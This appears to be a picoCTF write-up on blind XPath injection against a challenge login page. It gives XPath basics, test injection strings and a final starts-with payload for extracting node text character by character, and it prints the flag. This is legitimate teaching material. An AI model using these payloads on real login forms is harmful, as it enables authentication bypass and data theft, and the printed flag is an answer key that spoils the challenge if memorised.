http://mercury.picoctf.net:16521/

The hints shows that it is about xpath.

Learning what is XPath:

https://matthung0807.blogspot.com/2017/12/xpath.html

https://zh.wikipedia.org/wiki/XPath

https://jiang-niao.github.io/2020/04/24/%E4%BB%8Ectf%E9%A2%98%E7%9B%AE%E4%B8%AD%E5%AD%A6%E4%B9%A0xpath%E6%B3%A8%E5%85%A5/




This document is talking about 'what is xpath, and how to use it'.
If you want to understand how to get the flag, try to read to code xpathctf.py

XPath Example:
```
<?xml version="1.0" encoding="UTF-8"?> 
<root>
  <users>
    <user>
      <id>1</id>
      <username>admin</username>
      <password type='md5'>e10adc3949ba59abbe56e057f20f883e</password>
    </user>
    <user>
      <id>2</id>
      <username>jiangniao</username>
      <password type='md5'>099ebea48ea9666a7da2177267983138</password>
    </user>
    <user>
      <id>3</id>
      <username>skbl</username>
      <password type='md5'>e995e9ba0c8ec5c9ce392b86bfece354</password>
    </user>
  </users>
</root>

```

The type of node is:

```
<?xml version="1.0" encoding="UTF-8"?>: processing-instruction node
<root>: root element node
<id>: element node
type='md5': attribute node
jiangniao: text node
```
How to use xpath? this is the sample:

```
/root/users/user[username/text()='".$name."' and password/text()='".$pwd."']
``` 

If you want to list all of the text nodes, you can use wildcards "//\*", and [starts-with(text(),'a')] meas that checking there has a text node start from 'a' or not.

```
//*[starts-with(text(),'a')]
```

You can use this payload to test, is it have xpath vulnerability:

```
' or '1' or '
admin' or '1' or '
```


So, the final payload is :

```
' or //*[starts-with(text(),'a')] or 'a'='b
```

If you input this payload in username, the xpath search will like this:

```
/root/users/user[username/text()='' or //*[starts-with(text(),'a')] or 'a'='b' and password/text()='".$pwd."']
```

The priority of operator is:

<img width="300" alt="截圖 2022-03-09 下午2 57 50" src="https://user-images.githubusercontent.com/37798944/157388893-df93956d-ca48-44c7-a866-04e6ca6b198e.png">




First time run the xpathloop.py you can find all the nodes. But it needs lot of time. Maybe using multithreat is better....


<img width="1311" alt="截圖 2022-03-11 上午10 47 41" src="https://user-images.githubusercontent.com/37798944/157793080-641a75a1-6539-4e07-8ff4-3239e0910e85.png">


Here you got the part of FLAG "picoCTF{".
If edit the python file, let it start from "picoCTF{", you will get flag faster.
Run the xpathloop2.py, got the flag!

picoCTF{h0p3fully_u_t0ok_th3_r1ght_xp4th_28cb0023}



